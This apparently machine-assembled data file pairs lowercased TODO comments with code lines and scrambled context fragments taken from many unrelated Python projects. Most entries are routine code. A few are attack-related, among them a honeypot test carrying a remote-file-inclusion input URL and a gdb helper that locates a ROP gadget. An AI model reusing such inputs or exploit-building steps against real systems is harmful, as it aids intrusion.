raise exceptions.mpdnotimplemented  # todo </s> underscore, dash, dot and colon.	subscribe already. The name may consist of alphanumeric ASCII characters plus
# todo: remove logging </s> if len(rcpt_tos) == 1 and is_reply_email(rcpt_tos[0]) and mail_from == "<>":	handle LOG.w("Grey listing applied for mail_from:%s rcpt_tos:%s", mail_from, rcpt_tos) return "421 SL Retry later" LOG.w("out-of-office email to reverse alias %s. %s", rcpt_tos[0], msg.as_string()) return "250 SL E28"
annot.annotation_metadata.annotation_rules = "todo"  # todo </s> annot.annotation_metadata.validation_and_reliability = "todo"  # todo	fill_annoatation_metadata annot.annotation_metadata.version = "1.0" annot.annotation_metadata.annotation_tools = "Sonic Visualizer" annot.annotation_metadata.origin = "Centre for Digital Music" annot.annotation_metadata.annotator.name = "TODO"
# todo get annexed obj file </s> obj = _load_json_object(	_query_aggregated_metadata_singlepath if objloc is not None: obj_path = opj(agg_base_path, objloc) obj_path, cache=cache['objcache'])
# todo: remove this if-block.  this is a hack </s> if not type(vv) is dict:	write_json continue for kk,vv in iteritems(data_value): vv = {'Value':vv} tmp = {}
# time.sleep(40)  # todo: should remove after polling get. </s> mpc_1_2.block_with_timeout(40)	test_tensor_abstraction_subsets tensor_pointer_3 = data_3.send(clients[2]) mpc_1_2 = op(tensor_pointer_1, tensor_pointer_2) mpc_2_3 = op(tensor_pointer_2, tensor_pointer_3) mpc_2_3.block_with_timeout(40)
# todo: think about the most useful class api here </s> super(facetchart, self).__init__(spec=spec, facet=facet, **kwargs)	__init__ warnings.warn('FacetChart: data should be defined at the top level')
self.kernel_quantizer_internal._set_trainable_parameter() # todo recurrent as well? </s> kernel_constraint, kernel_initializer = (	QGRUCell ] if hasattr(self.kernel_quantizer_internal, "_set_trainable_parameter"): get_auto_range_constraint_initializer(self.kernel_quantizer_internal, kernel_constraint,
#todo: does not keep case </s> ('to it', 'to them'),	test__plnounoun ('mother-in-law', 'mothers-in-law'), ('about me', 'about us'), ('from it', 'from them'), ('with it', 'with them'),
# todo: expand to full set of info </s> def create_task_status_table(task_id, run_id, meta):	create_task_status_table table_name = run_id + str(task_id) return Table(
# todo fix. </s> self.assertequals(reil_ctx_out["rax"], res)	test_movq_4 res = 0x1234567812345678 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm0"], ctx_init["xmm0"])
# todo: animation change </s> self.job.building._producer__registered_collectors.remove(self)	finish_working def finish_working(self): print self.id, 'FINISH WORKING'
# todo: improve error message(add error code) </s> msg = (	data_for_update wrap_quotes = lambda op: "'" + op + "'" op_list = list(map(wrap_quotes, update_ops)) "Expected data of form " + "{" + ": [..], ".join(op_list) + ": [..]}"
# todo rename to "_to_reach_aspect_ratio"? matches other methods </s> def compute_paddings_for_aspect_ratio(arr, aspect_ratio):	compute_paddings_for_aspect_ratio "Pad amounts" here denotes the number of pixels that have to be added to each side to fulfill the desired constraint.
# todo(rbharath): there should be some automatic check to ensure that all </s> model_params = {"nb_hidden": 10, "activation": "relu",	test_multitask_keras_mlp_ECFP_classification_API with g.as_default(): task_type = "classification" "dropout": .0, "learning_rate": .01, "momentum": .9, "nesterov": False,
except exception: # todo: what exception? </s> return none	list_tags_disk try: f = metadata.get_format(self.get_loc_for_io()) if not f: return None
# todo: find a better way to do this. </s> user_es._default_filters = esquery.default_filters	test_unknown_user_reindexer self.assertEqual(0, UserES().run().total) user_es = UserES() results = user_es.run() self.assertEqual(1, results.total)
# todo ... </s> buildcontrolonelinetext(control)	buildControlSongDisplay def buildControlSongDisplay(control): return control
# todo: may test with codecs.open passing an encoding </s> with open(self.filename) as fobj:	test_import_from_csv_fobj def test_import_from_csv_fobj(self): table = rows.import_from_csv(fobj, encoding=self.encoding) self.assert_expected_table(table)
# todo(mattjj,phawkins): use 'yield from' when py2 is dropped </s> for a in abstract_tuple_tree_leaves(elt):	abstract_tuple_tree_leaves if type(aval) is AbstractTuple: for elt in aval: yield a else:
gc.collect()  # todo: see first comment above </s> cml.assert_logged(msg="finalizer called on: gitrepo(%s)" % path1,	test_GitRepo_flyweight with swallow_logs(new_level=1) as cml: del repo3 level="Level 1", regex=False)
# todo - implement searching google, bing, yahoo, baidu, and ask </s> def search_google(self):	search_google print("Searching Google") base_url = "https://google.com/search?q="
# todo: why would this throw an exception?  we should handle </s> pass	es_reindex es.create_index_if_missing("sumo") except pyes.ElasticSearchException: import questions.es_search questions.es_search.reindex_questions()
# todo remove </s> self.cursor.execute("insert into options ("	_createStorage + "type TEXT NOT NULL UNIQUE, " + "value REAL NOT NULL)") + "type, " + "value) VALUES (?, ?)", ("alertSystemActive", 0))
# todo: check if integerctype, not just ctype.arith (floats, etc.) </s> if (left.ctype.type_type == ctype.pointer and	BinaryOperatorNode return self.make_nonarith_equality_code(left, right, il_code) elif self.operator.kind == token_kinds.plus: right.ctype.type_type == CType.ARITH): arith_op, pointer_op = right, left
# todo: until we get it working. </s> if facts.is_from_app_store():	generate_absolute_recipe by this function! keys = recipe["keys"] warn_about_app_store_generation(facts, recipe["type"]) return
# todo: wells if display config has more than one column </s> "put_loners_in_wells": false	render_form "form_data": form_data, "form_table_options": { }, "side_pane": side_pane,
# todo: merge with backup in helpers </s> return false	_keeplatestbackup else:
# todo: add test for this </s> self.keyorder[key] = (self.generation, new_keyorder[key]) # prefer old	update_graph for key in new_keyorder: if key not in self.keyorder: if len(dsk) > 1: self.generation += 1  # older graph generations take precedence
# todo: remove constraint of batch_size == 1 </s> labels         = y_true[0, :, :]	_focal def _focal(y_true, y_pred): classification = y_pred[0, :, :] anchor_state   = keras.backend.max(labels, axis=1)  # -1 for ignore, 0 for background, 1 for object
# todo enforce uniqueness on arrange panel? </s> models.siparrange.objects.create(	copy_to_arrange logging.debug('copy_to_arrange: files to be added: {}'.format(to_add)) for entry in to_add: original_path=entry['original_path'], arrange_path=entry['arrange_path'],
#todo: it'd be nice to log and then ignore it if not data_is_complete. </s> assert self.data.is_complete	ofp_flow_mod po = None if self.data: assert self.buffer_id in (-1, None) self.buffer_id = self.data.buffer_id
# todo: use other libraries. </s> leave = gdb.execute('disas read_file',	get_leave_ret_gadget def get_leave_ret_gadget(): to_string=True).splitlines()[-3] gadget = leave.split()[0]
return none  # todo better error handling here </s> session_dict = response.json()	get_authenticated_user except Exception, e: log.error(e) if u'error' in session_dict: log.error("Error when getting authenticated user: %s" % session_dict['error'])
# todo(pachristopher): remove this once tfdv 0.14 is released. </s> (major, minor, _) = tfdv.__version__.split('.')	compute_stats lambda x: {key: np.asarray([x[key]])  # pylint: disable=g-long-lambda for key in x if x[key] is not None})) if int(major) > 0 or int(minor) >= 14: raw_data |= ('BatchExamplesToArrowTables' >>
# todo is pexpect thread safe, e.g. could we be blocked on this </s> pnum = self.con.expect('notification handle = .*? \r', timeout=.5)	_expect with self.connection_lock: try: if pnum == 0: self._handle_notification(self.con.after)
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
pass # todo: raise exception </s> else:	connect self.__signals[signal].append(function) else: pass # TODO: raise exception
loader = imageloader(32) #todo crop=true? </s> x, y = loader.load(fixture_path('images'), width=4, height=4)	ImageLoaderTest def test_load_fixture_single(self): with self.test_session(): self.assertEqual(y.get_shape(), []) self.assertEqual(int(x.get_shape()[1]), 4)
# todo: ... </s> pass	purchase_album def purchase_album(user: Account, album: Album, amount_paid: float, stripe_token: str):
if not isinstance(self.name_str, (str, unicode)):  # todo remove </s> analysis.add(self._evaluator, 'attribute-error', self.name_str)	_names_to_types and not (isinstance(self.name_str, pr.NamePart) and isinstance(self.name_str.parent.parent, pr.Param)): print(self.scope, self.name_str.parent.parent, self.name_str, self.position, self.name_str.start_pos)
pass # todo: some magic with getstate to find out if it's the </s> self.dispatch_event(event, symbol, self._get_modifiers(lparam))	_event_key symbol = key.RALT elif symbol == key.LSHIFT: if self._exclusive_keyboard: return 0
# todo(ralexstokes) look at better way to handle once we have fork choice in place </s> except finalizedheadnotfound:	BeaconChainSyncer try: finalized_head = await self.chain_db.coro_get_finalized_head(BeaconBlock) return best_peer if best_peer.head_slot <= finalized_head.slot:
else: # xxx todo: convert warning into a bqlerror. </s> warnings.warn(	ungrouped_schema if len(guessed_reason) > 0 or guessed_type == 'key': schema += "''' %s" % (os.linesep,) 'Encountered a zero-length column name. Please ' 'revise the .csv such that all columns have headers.')
# todo: use regex matching instead of this </s> assert str(staking_agent.get_current_period()) in result.output	test_nucypher_status_stakers assert result.exit_code == 0 staking_agent = ContractAgency.get_agent(StakingEscrowAgent, registry=test_registry) for staker in stakers: assert staker.checksum_address in result.output
# xxx todo: investigate what the meaning of dominsert is about </s> self.graphicspanel.insert(w, self.graphicspanel.getelement(), rpindex)	addGraphicsRenderingPanel w.setPixelSize(getXChartSize(), getYChartSize()) GChart.setOverflow(w, "hidden") self.graphicsPanel.setWidgetPosition(w, 0, 0)
# todo: figure out how to re-use the same return function in base.py </s> http.status_unauthorized()	check_roles log.debug("validation_failed? %s " % validation_failed) if (validation_failed): http.header('Content-Type', 'application/json') return json.dumps("Certificate Validation Failed", default=pymongo.json_util.default)
else: # todo: deprecated </s> self.depsgraph = context.depsgraph	execute if hasattr(context, 'evaluated_depsgraph_get'): self.depsgraph = context.evaluated_depsgraph_get() self.preprocess() scene_objects = self.scene.collection.all_objects
# todo: add function names </s> self._storage.store({	wrapper if not details: file_path, file_hash = self._download_and_hash(urls) 'file_hash': file_hash, 'file_path': file_path,
if jaxpr.constvars: raise notimplementederror  # todo(mattjj) </s> env: dict[var, bool] = {}	dce_jaxpr def dce_jaxpr(jaxpr: Jaxpr, used_outputs: List[bool] ) -> Tuple[Jaxpr, List[bool]]: def read(v: Var) -> bool: return env.get(v, False)
# @todo: move to css </s> _style="padding-bottom:10px",	member_rheader "pr_person", _class="fleft"), ), TABLE(TR(TH(s3_fullname(person))),
# todo: serialize the policy </s> return response('policy created!', status=200)	create_policy new_policy = drone_alice.create_policy(bob, label, m, n, federated=federated_only)
# todo(bcipolli): bulk saving of logs </s> log.save()	generate_fake_video_logs ) log.full_clean() video_logs.append(log) return video_logs
# todo: configurable timeout??? </s> syndic_dict['dead_until'] = time.time() + 60	_call_syndic except SaltClientError: log.error('Unable to call {0} on {1}, trying another...'.format(func, master_id)) continue log.critical('Unable to call {0} on any masters!'.format(func))
# todo: this is lazy, we should only reconfigure the drone(s) who are actually </s> if drone_edge:	_handle_command_bait_user_delete drone_edge = db_session.query(DroneEdge).filter(DroneEdge.username == bait_user.username, DroneEdge.password == bait_user.password).first() self._reconfigure_all_clients() else:
# todo: remove this - a leftover from an earlier version, needed for old </s> self.flt = filteriir(b=np.array(fb.fil[0]['ba'][0][0:3]),	get_hdl_dict } }) a=np.array(fb.fil[0]['ba'][1][0:3]), word_format=(hdl_dict['QI']['WI'] + hdl_dict['QI']['WF'], 0,
# todo: the following skipped suite and fixtures should be enabled </s> return ['api-key']	_filter_headers def _filter_headers(self):
# todo: refactor </s> selection = utils.normalize(selection_content, ignore=['_'])	_selection_matches def _selection_matches(self, selection_content, cell_value): if not selection: return False
# todo don't change get_code, the whole thing should be the same. </s> assert src == p.module.get_code()[:-1]	check_fp p = FastParser(load_grammar(), u(src)) cache.save_parser(None, None, p, pickling=False) assert p.number_parsers_used == number_parsers_used return p.module
# todo: remove this when the checks in `before_run` have been moved to the template </s> self._neuron_index = none	__init__ name='spikegeneratorgroup*', codeobj_class=None): Group.__init__(self, dt=dt, clock=clock, when=when, order=order, name=name) self._spike_time = None self._spikes_changed = True
# todo: test filter functionality more </s> f = multistagechannelfilter(input_rate=8000, output_rate=21234, cutoff_freq=8000, transition_width=5000)	test_odd_interpolating def test_odd_interpolating(self): self.__run(f, 4000, 21234/8000)
# pattern for a markdown todo-list () </s> pattern = re.compile(".*-\s" + "(\[[\sx]\]).*")	parse_markdown checked = lambda x: "[x]" in x body = [line.encode('utf-8') for line in markdown_body.split("\n")] todo_list = [line for line in body if pattern.match(line) is not None] for i, todo in enumerate(todo_list):
# todo: remove getattr when https://github.com/rtfd/readthedocs.org/pull/3339 got merged </s> build_image = getattr(self.config, 'build_image', self.version.project.container_image) or docker_image	is_obsolete log.error('Unable to read/parse environment.json file') return False return any([ env_python_version != self.config.python_version,
self.assertequal(out.strip(), "inactive") # todo real "failed" </s> kill_testsleep = "killall {testsleep}"	test_4090_simple_service_RemainAfterExit logg.info(" %s =>%s \n%s", cmd, end, out) self.assertEqual(end, 3) sx____(kill_testsleep.format(**locals())) self.rm_testdir()
# todo: sessions and not only dates/days should be considered </s> return true	_barisover_microseconds bartm = self.data.datetime.time(index) if bardt > dt: usecond = tm.microsecond + \ (tm.hour * 3600 + tm.minute * 60 + tm.second) * 1000000
# todo: until we get it working. </s> if facts.is_from_app_store():	generate_sccm_recipe by this function! keys = recipe["keys"] warn_about_app_store_generation(facts, recipe["type"]) return
# todo: unique constraint </s> else:	validate_list self.validate_map(item, item_schema) self.path[level] =+ 1 for item in items: if not self.istype(item, schema_type):
# todo: check arp reply is valid </s> self.asserttrue(self.packet_outs_from_flows(arp_replies))	test_arp_for_controller 'arp_source_ip': '10.0.0.1', 'arp_target_ip': '10.0.0.254'})
assert ne.test("frexp(z3)", xr.dataarray(xr.ufuncs.frexp(z3)))  # fixme todo fails with xarray >= 0.8 </s> z3 = np.arange(27)	test_broken_frexp ne.set_ae(False)
# todo test that citext.sql gets loaded with 9.0.x </s> psycopg2.connect().cursor().execute.side_effect = mocked_execute	test_setupdb_app_main_not_utc_timezone with mock.patch(self.psycopg2_module_path) as psycopg2: app = setupdb_app.SocorroDB(config) psycopg2.connect().cursor().fetchall.side_effect = mocked_fetchall stderr = StringIO()
# todo(rbharath): this is wrong!! </s> self.out_tensor = xp	AttnLSTMEmbedding y = model_ops.concatenate([q, r], axis=1) q, states = lstm(y, *states) return [x + q, xp] def none_tensors(self):
# todo: better to use an inotify method that doesn't conflict with eventlets. </s> changed = false	files_changed def files_changed(self): if self.config_hashes: new_config_file_stats = stat_config_files(self.config_hashes)
# todo: send `goodbye` req then disconnect </s> return	Node beacon_blocks_request = await read_req(stream, BeaconBlocksRequest) except ReadMessageFailure as error: self.logger.debug("Received the beacon blocks request message %s", beacon_blocks_request) requested_beacon_blocks = []
# todo(developer): uncomment and set the following variables </s> parent = client.location_path(project_id, location_id)	create_scheduler_job from google.cloud import scheduler client = scheduler.CloudSchedulerClient() job = { 'app_engine_http_target': {
# todo this creates an identical dataframe for every hour. we only need one for all hours. </s> for h in range(1, 25):	fetch_generation_forecast response = r.get(url) obj = webparser(response) data_temp = fetch_hourly_generation_forecast('BO', obj, h, formatted_date) data[h - 1] = data_temp
# todo: implement me </s> return tracks	get_subtitle_tracks def get_subtitle_tracks(self): tracks = list()
for joint in annos:  # todo : speed up with affine transform </s> adjust_joint = []	keypoint_random_resize mask = cv2.resize(mask, (neww, newh), interpolation=cv2.INTER_AREA) adjust_joint_list = [] for point in joint: if point[0] < -100 or point[1] < -100:
# todo: this loop is pretty slow .. (parellize) </s> for iky in range(self.nky):	getJ Jtv_temp0 = np.zeros((m.size, rx.nD), dtype=float) Jtv = np.zeros((m.size, rx.nD), dtype=float) u_src = f[src, self._solutionType, iky] ky = self.kys[iky]
# todo warn the user? </s> if error != 0x17:	get_glyph_data self.dpi, self.dpi) FreeTypeError.check_and_raise_on_error('Could not set size for "%c"' % character, error) glyph_index = self.get_character_index(character)
# todo(somebody): make this a literal type. </s> justify: str = 'rjust'):	testParamListIndentationCollision1 Type[LineCharset]] = AsciiCharset, preprocess: Callable[[str], str] = identity, self._cs = charset self._preprocess = preprocess
# todo(twd2): do more visibility check eg. contest </s> ddocs, dpcount, _ = await pagination.paginate(	DiscussionNodeHandler if vnode['doc_type'] == document.TYPE_PROBLEM and vnode.get('hidden', False): self.check_perm(builtin.PERM_VIEW_PROBLEM_HIDDEN) discussion.get_multi(self.domain_id, parent_doc_type=vnode['doc_type'],
#todo(sbaker) check for a non-default router for this network </s> try:	handle_delete router_id = self.metadata['router_id'] subnet_id = self.resource_id client.remove_interface_router( router_id,
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: check for ip subnet/range and break it out to individuals </s> ip_target = []	nmap_scan if data: ip_exclude = data.split('\r\n') data = form.vars.get('f_target_list') if data:
# todo(ytknzw): add more specific assertion with the test case. </s> figure = plot_slice(study, params=["y_log"])	test_plot_slice_log_scale ) ) assert figure.has_data() is True figure = plot_slice(study, params=["x_linear"])
# todo: pico-8 doesn't allow multiline strings, so this probably </s> lxr = lexer.lexer(version=4)	testStringMultipleLines def testStringMultipleLines(self): lxr._process_line('"abc def ghi \n') lxr._process_line('and jkl"\n')
# @todo: follow global settings: </s> settings.ui.filter_auto_submit = 750	deployment return output s3.postp = postp settings.ui.report_auto_submit = 750 return s3_rest_controller(hide_filter=False)
#todo link to some protocol for reporting this </s> log.exception(	perform raise except ValidationException: "please report the following unknown response format for %s: %r", call_name, msg
# todo: rewrite in python. </s> command = [	create_iconset_old_implementation offset_white = 1 opacity_white = 100 convert_path, template_icon, "(", "(", TEMP_MASK_IMAGE, "-colorize", "3,23,40", ")",
# todo check the op returned a view </s> if dmap and idx in dmap:	summary_memory vmap = getattr(node.op, 'view_map', None) for idx, v in enumerate(val): node_memory_saved_by_inplace += v elif vmap and idx in vmap:
""" todo: documentation </s> return false	streaming @property def streaming(self):
continue ### todo </s> if tag_name != tag_name.lower():	test_sanitizer for tag_name in sanitizer.HTMLSanitizer.allowed_elements: if tag_name in ['caption', 'col', 'colgroup', 'optgroup', 'option', 'table', 'tbody', 'td', 'tfoot', 'th', 'thead', 'tr']: continue ### TODO if tag_name == 'image':
""" todo: documentation </s> return false	retainsevents @property def retainsevents(self):
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_min_weight_magnitude_float def test_fail_min_weight_magnitude_float(self): ``min_weight_magnitude`` is a float.
# todo: spaces should depend on the horizontal </s> if isinstance(self.facet, facet_wrap):	_make_axes sharex=False, sharey=False) hspace = len(self.facet.vars) * .20 plt.subplots_adjust(wspace=.05, hspace=hspace)
# todo raise expected values once tests complete successfully </s> self.asserttrue(scores.mean() > 0.65,	test_crossval_normalized duration_col='t', event_col='E', k=3) "CoxPH should solve this simple normalized data")
#todo(bcwaldon): implement optional kwargs such as limit, sort_dir </s> return retval	index if k in ['id', 'name']])]
# todo: kept for backwards compatibility. </s> self._written_event_source_index = 0	__init__ self._storage_type = storage_type
# todo check for if-modified-since and if-none-match </s> with open(path, 'rb') as f:	serve modified = datetime.utcfromtimestamp(int(os.path.getmtime(path))) self.set_header('Last-Modified', modified) self.write(f.read())
pass # todo </s> def handle_request(self, input):	handle_request
# todo: reconsider this. </s> if new_config_value is none or new_config_value is false:	types_compatible if base_config_value is None: return True return True if (isinstance(new_config_value, (type(u''), str))
# todo: ugly n^2 </s> c.sons = [	get_list_for_object comment_list = list(qset) for c in comment_list: i for i in comment_list \ if i.path.startswith(c.path) and i.level == c.level+1
# todo: specific exception handling </s> display_message("project configuration: error parsing keyboard shortcuts from %s. configuration may be wrong." % source, "warning", 5)	__parse_kb_shortcuts shortcuts[key] = type except: shortcuts = default return shortcuts
# todo: handle return value from sandbox </s> input: http://localhost:8080/test.php?p="http://google.com/index.html	test_rfi_emulator_with_malformed_uri def test_rfi_emulator_with_malformed_uri(self): Expected Result: The return value from the PHP sandbox. Notes: Injected file contains <?php echo("test successful"); ?>"""
# todo: remove this hack asap </s> subprocess.call('systemctl reboot -i', shell=true)	handle_open time.sleep(0.5)  # Allows system time to start the eyes spinning
# todo constrain value to be in the directory </s> load_list_js.append(plugin_resource_url + resource_def.load_js_path)	_add_plugin_resources load_list_css.append(plugin_resource_url + resource_def.load_cs_path) if resource_def.load_js_path is not None: for mode_def in get_modes(): mode_table[mode_def.mode] = {
# todo: add bot's signature if needed (bug: t131517) </s> title = none	get_sd_template sd = i18n.twtranslate(self.site, 'redirect-broken-redirect-template') if sd: template = extract_templates_and_params_regex_simple(sd)
# todo: scale and translation could be merged into a single network </s> with tf.variable_scope("scale"):	forward_and_jacobian mask = self.get_mask(inputs, dtype=inputs.dtype) masked_inputs = inputs * mask scale = self.scale_fn(masked_inputs) with tf.variable_scope("translation"):
# todo(nate): temporarily disabled </s> self.step.job.build_id.hex, self.step.id.hex)	process self.logger.exception('Failed to parse manifest.json; (build=%s, step=%s)',
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
#todo - what is bio.popgen using this for? </s> self.param_types = types	__init__ is_required = False, description = ""): self.names = names self.checker_function = checker_function self.description = description
#todo: review this carefully, as we are now deleting stuff </s> for f in file_set - vcs_file_set:	sync_from_vcs new_path = os.path.join(podir_path, f) shutil.copy2(vcs_f, new_path) remove_path = os.path.join(podir_path, f) os.remove(remove_path)
# todo: i18n/l10n: spaces aren't always the correct word separator </s> words = search.split(" ")	_adapt_search def _adapt_search(self, search, suggestion): search = "" for word in words:
# todo: must be implemented </s> pass	get_range_from_chapters def get_range_from_chapters(self, crawler, times=0):
# todo: hacked @ hackathon, fix the comments </s> self.inited.add(id(self))	store_initial_state if self.parent is not None: block.parent = self.parent.id for child in self.children: child.store_initial_state()
# todo: i can't manage the import issue, can you? </s> new_args, new_type = syft.frameworks.torch.hook_args.hook_function_args(cmd, args)	handle_func_command cmd, _, args = command print("Logtensor logging function", cmd) new_command = (cmd, None, new_args) response = new_type.handle_func_command(new_command)
# todo packages for cloudera not available on lucid yet, using karmic for the moment (beta 1) </s> pass	_setup_hadoop http://archive.cloudera.com/docs/ec2.html http://archive.cloudera.com/cdh/3/
# todo candidate for move to system/osi as not btrfs related </s> smap = {	convert_to_KiB def convert_to_KiB(size): 'KiB': 1, 'MiB': 1024,
# # todo: add error handler </s> request_dict = {'module': module_name, var_name: var_value}	build_enrichment_request_json def build_enrichment_request_json(module_name, var_name, var_value): config_json = build_config_json(module_name) if config_json:
# todo: remove </s> return []	get_sub_commads def get_sub_commads(self):
def getconfig(self, option, default=''):  #@todo: remove in 0.4.10 </s> try:	getConfig return self.getConf(option) except KeyError:
#todo: consider factoring out: some duplication between xliff and tmx </s> text = errorname + ': ' + errortext	adderror def adderror(self, errorname, errortext): self.addnote(text, origin="pofilter")
# todo: allow other formats? </s> for key, xy in config['thumb_sizes'][item._thumb_dir].iteritems():	create_thumbs_for DBSession.add(item) DBSession.flush() path = thumb_path(item, key) thumb_img = resize_thumb(img, xy)
# todo: remove in 0.9.0 </s> def _warning_wrapper_is(meth_name, func, *args, **kwargs):	_warning_wrapper_is warnings.warn("Starting from transitions version 0.8.3, 'is_<state_name>' convenience functions will be" " assigned to 'is_<model_attribute>_<state_name>' when 'model_attribute "
# todo action required that updates the endpoint </s> endpoints = []	collect_on def collect_on(self, args): eps = self._get_endpoints(args, -1) for endpoint in eps:
# todo implement </s> return 0	level @property def level(self):
# todo extend to nonbinary nodes </s> augmented_child_tpms = [	marbl return self._marbl else: [child._dimension_labels[self.index], child.tpm[1].squeeze()] for child in self.outputs
# todo: using html formating tags eg. <pre> in ocil content </s> if rule.ocil:	export_ocil_to_file boolean_question = ET.SubElement( questions, "boolean_question", id=rule.id_ + "_question") ocil_without_tags = re.sub(r"</?[^>]+>", "", rule.ocil) else:
# todo: use lazylist </s> path = api_root + 'zones.xml'	list_zones def list_zones(self): data = self.connection.request(path).object zones = self._to_zones(elem=data)
else:  # todo assuming 720 webcam for now </s> if p['fps'] <= 30:	_videostream else: cvbr = br60[y] cvbr = br30['720'] else:
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	unrescue def unrescue(self, instance, callback, network_info):
# todo make this a private api </s> latitude = feature.get('geometry', {}).get('coordinates', [])[1]	parse_code @staticmethod def parse_code(feature): longitude = feature.get('geometry', {}).get('coordinates', [])[0] placename = feature.get('properties', {}).get('name')
# todo handle bad type </s> if type != none:	optionalproperty value = config.extra_props[name] del config.extra_props[name] value = type(value) self.__dict__[name] = value
# todo: fatal, how should this be handled? </s> raise exception()	_on_pad_removed peer = pad.get_peer() if peer is not None:
# todo: make remoteapp.create_all_files not return media files </s> extension = os.path.splitext(name)[1]	_files for name, f in _download_index_files(self.request): if name not in skip_files: data = f.encode('utf-8') if extension in text_extensions else f yield (get_name(name), data)
# todo: only move interfaces attached to self.wlan, or all nodenum in script? </s> moved_ifaces = []	runround return return self.run() for iface in self.net.get_ifaces(): node = iface.node
# todo: skip anything that's not marathon </s> if 'tasks' in framework:	find_agent_id if 'frameworks' in state: for framework in state['frameworks']: for task in framework['tasks']: if 'id' in task and app_id in task['id']:
# todo this is a bit jankey to be honest </s> if apps_changed:	ready settings.INSTALLED_APPS += [plugin_path] apps_changed = True apps.app_configs = OrderedDict() apps.apps_ready = apps.models_ready = apps.loading = apps.ready = False
# todo: can just leave this in superclass </s> which = none	apply def apply(self): if self.should('install'): self.do('install')
# todo - molecule type - see issue 363 / pull request #1005 </s> d = consumer.data.annotations.get('data_file_division', none)	test_topology_embl self.assertEqual(t, topo, "Wrong topology %r not %r from %r" % (t, topo, line)) self.assertEqual(d, div, "Wrong division %r not %r from %r" % (d, div, line))
# todo get stacktrace </s> raise error, ex.message()	_handle_sql_exception_jpype SQLException = jpype.java.sql.SQLException if issubclass(ex.__javaclass__, SQLException): else: raise ex
# todo check if config was successfully updated </s> return shutdowns	shutdown_ip else: self.config(self.config_file, 'shutdown', int(port), switch)
# todo check if obsolete </s> old_name, index = common.decode_string(data, 0)	build_scene_renamed def build_scene_renamed(data): new_name, _ = common.decode_string(data, index) if share_data.use_experimental_sync():
# todo: check the result </s> matrix33.create_from_eulers([1,2,3])	test_create_from_eulers def test_create_from_eulers(self):
# todo: do we really need to populate the unnamed reg when we're populating the small </s> vi_cmd_data = {	testCanPopulateSmallDeleteRegister def testCanPopulateSmallDeleteRegister(self): 'can_yank': False, 'populates_small_delete_register': True,
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# arno, 2010-02-10: todo: convert infohash to binary </s> return torrent	getTorrentFromTorrenthash sql = "select * from Torrent where infohash==?" torrent = self._db.fetchone(sql,(bin2str(torrenthash),))
pass # todo </s> def _delete(self, position=none, start=none, end=none):	_delete @register(r'^delete ((?P<position>\d+)|(?P<start>\d+):(?P<end>\d+)*)$')
# todo(jamalex): burn it all down! </s> if language == "pt-br":	get_topic_tree def get_topic_tree(force=False, annotate=False, channel=None, language=None, parent=None): language = "pt" if not channel:
# todo: py2 does not support multiple * unpacking expressions in a single call. </s> packed_args = check_fix_args + chunk	run_black output = "" for chunk in grouper(file_list, 100): output = black_cmd(*packed_args, fail_on_error=False, output=str, error=str) returncode |= black_cmd.returncode
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
# todo: /data/local/tmp might not be execuable and atx-agent can be somewhere else </s> device.shell_output("/data/local/tmp/atx-agent", "server", "-d")	connect_usb warnings.warn("backend atx-agent is not alive, start again ...", RuntimeWarning) deadline = time.time() + 3 while time.time() < deadline:
# todo check for collision with user filter </s> user_inner = cutoff_freq-transition_width/2	MultistageChannelFilter gr.firdes.WIN_HAMMING) else: limit = next_rate/2 taps = gr.firdes.low_pass(
f, en, nm = getcnns(level=1) # todo more flexible load needed. </s> landmark = nm.forward(face[:, :, 8:, :])	NM face = cv2.resize(face, (39, 39)).reshape((1, 1, 39, 39)) face = processImage(face) return landmark
# todo: improve this code. </s> if self._architecture == arch_arm:	_build_from break raw_bytes = self._mem[start_addr:end_addr] try: asm_instr = self._disasm.disassemble(raw_bytes, start_addr, architecture_mode=self._architecture_mode)
# todo: this add_metadata call should be removed once we are </s> question.add_metadata(product=product['key'])	aaq question.add_metadata(**form.cleaned_metadata) if product: for p in Product.objects.filter(slug__in=product.get('products')): question.products.add(p)
# todo: fix self.cursor_x >= w </s> line = self.output.lines[self.win_y + self.cursor_y]	main_k_end def main_k_end(self, h, w): if len(line) >= w: self.cursor_x = w - 1
# todo handle file does not exist </s> minio.copy(minio.userfilesbucket, new_key,	duplicate ) assert new_key != uploaded_file.key f'{uploaded_file.bucket}/{uploaded_file.key}') new_wfm.uploaded_files.create(
# todo: list is incomplete, to be completed for missing languages. </s> self.doc_subpages = {	__init__ 'pt': self.alphabetic, } '_default': ((u'/doc', ), ['en']
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> context = self.create_authentication_context_stub(cp['authoritytenant'])	test_federated_unknown_token_type def test_federated_unknown_token_type(self): mex = self.create_mex_stub(cp['adfsWsTrust']) userRealm = self.create_user_realm_stub('wstrust', 'federated', cp['adfsMex'], cp['adfsWsTrust'])
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
self.select(1)  # todo this should work without havng to use select() i.e. if cursor is at point on target. </s> self.feed("cs'<q>")	test_documentation_examples self.feed('cs"\'') self.assertNormal("|'Hello world!'") self.assertNormal('|<q>Hello world!</q>') self.feed('cst"')
# todo: disconnect </s> return	Node reason, ) not_on_canonical_chain = False if not head_block_not_found:
